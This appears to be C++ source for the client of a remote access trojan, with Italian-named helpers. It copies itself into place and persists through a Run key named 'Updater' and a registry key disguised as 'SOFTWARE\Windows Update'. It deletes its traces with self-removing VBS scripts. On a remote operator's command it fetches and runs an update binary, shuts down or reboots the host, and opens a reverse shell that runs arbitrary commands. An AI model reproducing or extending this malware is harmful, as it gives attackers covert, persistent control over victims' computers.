#pragma once

bool IsInstalled()
{
	RegUtils ru;

	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
}

short InstallClient()
{
	Settaggi sett;
	RegUtils ru;
	SystemUtils su;
	DirUtils du;
	EasyMSGB msgb;

	sett.InstallSettings();

	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;

	if (PathToCopy.find("<User>") != string::npos)
		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());

	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");

	if (sett.RegStartup)
		if (!ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
			return 2;

	//msgb.Ok(PathToCopy);

	if (du.GetFullModuleFilePath() != PathToCopy)
	{
		du.DelFile(PathToCopy);
		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
			return 3;

		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", "WScript.Sleep 1500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"");
		su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
	}
	
	su.RunExe(PathToCopy);

	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
		return 4;

	return 0;
}

bool GetInfo(SOCKET Sock)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;
	Settaggi sett;

	sett.GetSettingsFromReg();

	json j;

    j["IPL"] = TcpIP::GetLocalIP(Sock);
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = sett.InstallDate;

	return COMUNICAZIONI::GetInfo(Sock, j.dump());
}

bool InvertMouse(SOCKET Sock)
{
	MouseUtils mu;

	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
}

bool UpdateClient(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	RegUtils ru;
	COMUNICAZIONI::NewClient NewClient;

	NewClient = COMUNICAZIONI::UpdateClient(Sock);

	if (NewClient.j.dump() == "null")
		return false;

	if (!du.CheckDir(du.GetModuleFilePath() + "VXBkYXRl"))
		du.MakeDir(du.GetModuleFilePath() + "VXBkYXRl");

	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient.Str))
		return false;

	if (NewClient.j["Hidden"])
		su.NoOutputCMD("attrib +h \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
	if (NewClient.j["System"])
		su.NoOutputCMD("attrib +s \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");

	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetFullModuleFilePath() + "\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
		return false;

	ru.RegDelKey("SOFTWARE\\Windows Update");

	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

	return true;
}

void Uninstall()
{
	RegUtils ru;
	DirUtils du;
	SystemUtils su;

	ru.RegDelKey("SOFTWARE\\Windows Update");
	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");

	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"");
	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
}

void RestartClient()
{
	DirUtils du;
	SystemUtils su;

	su.RunExe(du.GetFullModuleFilePath());
}

void ReverseShell(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	
	string Cmd;
	string Res = "OK";
	
	while (true)
	{
		Cmd = COMUNICAZIONI::ReverseShell(Sock, Res);
		
		if (Cmd == "")
			return;
		else if (Cmd == "Get cd")
			Res = du.GetModuleFilePath(false);
		else if (ToLowerCase(Cmd).find("chdir") != string::npos)
		{
			if (ToLowerCase(Cmd) == "chdir ..")
			{
				string tmp = du.GetModuleFilePath();
				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
			{
				if (Cmd.find("\"") != string::npos)
					du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10));
				else
					du.SetCurrDir(Cmd.substr(9));
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
			{
				if (Cmd.find("\"") != string::npos)
					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
				else
					du.SetCurrDir(Cmd.substr(6));
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd).find("cd") != string::npos)
		{
			if (ToLowerCase(Cmd) == "cd ..")
			{
				string tmp = du.GetModuleFilePath();
				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
			{
				if (Cmd.find("\"") != string::npos)
					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
				else
					du.SetCurrDir(Cmd.substr(6));
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 3)) == "cd ")
			{
				if (Cmd.find("\"") != string::npos)
					du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4));
				else
					du.SetCurrDir(Cmd.substr(3));
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd) == "exit")
		{
			COMUNICAZIONI::ReverseShell(Sock, "Reverse shell closed");
			return;
		}
		else
			Res = su.GetCMDOutput(Cmd);
	}
}

short Sessione(TcpIP Client)
{
	SystemUtils su;
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			i = false;
		else if (cmd == "getinfo")
		{
			i = GetInfo(Client.Sock);
		}
		else if (cmd == "invertmouse")
		{
			i = InvertMouse(Client.Sock);
		}
		else if (cmd == "reconnect")
		{
			i = false;
		}
		else if (cmd == "kill")
		{
			return 1;
		}
		else if (cmd == "shutdown")
		{
			su.NoOutputCMD("shutdown -s -t 0");
			return 1;
		}
		else if (cmd == "reboot")
		{
			su.NoOutputCMD("shutdown -r -t 0");
			return 1;
		}
		else if (cmd == "updateclient")
		{
			if (UpdateClient(Client.Sock))
				return 1;
		}
		else if (cmd == "uninstall")
		{
			Uninstall();
			return 1;
		}
		else if (cmd == "restart")
		{
			RestartClient();
			return 1;
		}
		else if (cmd == "reverseshell")
		{
			ReverseShell(Client.Sock);
		}
	}

	return 0;
}